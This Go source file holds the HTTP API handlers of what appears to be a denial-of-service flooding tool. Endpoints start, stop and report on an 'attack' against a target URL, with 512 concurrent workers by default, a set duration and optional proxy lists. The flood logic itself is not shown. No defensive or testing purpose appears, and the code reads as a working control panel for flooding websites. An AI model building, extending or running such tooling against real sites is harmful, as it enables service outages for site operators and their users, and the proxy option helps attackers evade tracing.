package main

import (
	"encoding/json"
	"net/http"
	"strings"
)

// writeJSON serialises v into the response with the given HTTP status code.
func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(v)
}

// ok200 sends a successful APIResponse envelope.
func ok200(w http.ResponseWriter, msg string, data interface{}) {
	writeJSON(w, http.StatusOK, APIResponse{OK: true, Message: msg, Data: data})
}

// fail sends an error APIResponse envelope.
func fail(w http.ResponseWriter, status int, msg string) {
	writeJSON(w, status, APIResponse{OK: false, Message: msg})
}

// ── handlers ──────────────────────────────────────────────────────────────────

// handleStart handles POST /api/attack/start
//
// Body (all fields optional except target):
//
//	{
//	  "target":     "https://example.com",   // required
//	  "method":     "httpget",                // default: httpget
//	  "workers":    512,                      // default: 512
//	  "duration":   30,                       // default: 30  (seconds)
//	  "proxy_file": "/path/to/proxies.txt",   // optional
//	  "verbose":    false,
//	  "rate_delay": 0                         // ms between requests per worker
//	}
func handleStart(w http.ResponseWriter, r *http.Request) {
	var req StartRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		fail(w, http.StatusBadRequest, "invalid JSON body: "+err.Error())
		return
	}

	// apply sensible defaults
	if req.Method == "" {
		req.Method = "httpget"
	}
	req.Method = strings.ToLower(req.Method)
	if req.Workers == 0 {
		req.Workers = 512
	}
	if req.Duration == 0 {
		req.Duration = 30
	}

	cfg := AttackConfig{
		Target:    req.Target,
		Method:    req.Method,
		Workers:   req.Workers,
		Duration:  req.Duration,
		ProxyFile: req.ProxyFile,
		Verbose:   req.Verbose,
		RateDelay: req.RateDelay,
	}

	if err := state.Start(cfg); err != nil {
		fail(w, http.StatusConflict, err.Error())
		return
	}

	ok200(w, "attack started", map[string]interface{}{
		"target":   cfg.Target,
		"method":   cfg.Method,
		"workers":  cfg.Workers,
		"duration": cfg.Duration,
	})
}

// handleStop handles POST /api/attack/stop
func handleStop(w http.ResponseWriter, r *http.Request) {
	if err := state.Stop(); err != nil {
		fail(w, http.StatusConflict, err.Error())
		return
	}
	ok200(w, "attack stopped", nil)
}

// handleStatus handles GET /api/attack/status
func handleStatus(w http.ResponseWriter, r *http.Request) {
	status := state.Status()
	ok200(w, "ok", status)
}

// handleHealth handles GET /api/health
func handleHealth(w http.ResponseWriter, r *http.Request) {
	ok200(w, "ok", map[string]string{"status": "healthy"})
}
